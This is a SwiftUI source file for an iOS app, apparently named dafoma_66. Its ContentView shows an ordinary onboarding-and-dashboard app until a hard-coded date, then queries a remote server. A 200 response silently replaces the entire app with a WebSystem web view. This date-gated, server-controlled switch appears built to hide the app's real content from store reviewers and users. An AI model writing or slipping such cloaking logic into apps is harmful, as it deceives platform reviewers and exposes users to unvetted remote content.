//
//  ContentView.swift
//  dafoma_66
//
//  Created by IGOR on 13/10/2025.
//

import SwiftUI

struct ContentView: View {
    @StateObject private var dataManager = DataManager()
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    @State private var showOnboarding = true
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    Group {
                        if hasCompletedOnboarding && !showOnboarding {
                            DashboardView(dataManager: dataManager)
                        } else {
                            OnboardingView(showOnboarding: $showOnboarding)
                        }
                    }
                    .onChange(of: showOnboarding) { newValue in
                        if !newValue {
                            hasCompletedOnboarding = true
                        }
                    }
                    .onAppear {
                        if hasCompletedOnboarding {
                            showOnboarding = false
                        }
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "26.10.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        // Дата в прошлом - делаем запрос на сервер
        makeServerRequest()
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = true
            self.isFetched = true
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        URLSession.shared.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                if let httpResponse = response as? HTTPURLResponse {
                    
                    if httpResponse.statusCode == 404 {
                        
                        self.isBlock = true
                        self.isFetched = true
                        
                    } else if httpResponse.statusCode == 200 {
                        
                        self.isBlock = false
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // В случае ошибки сети тоже блокируем
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}

#Preview {
    ContentView()
}
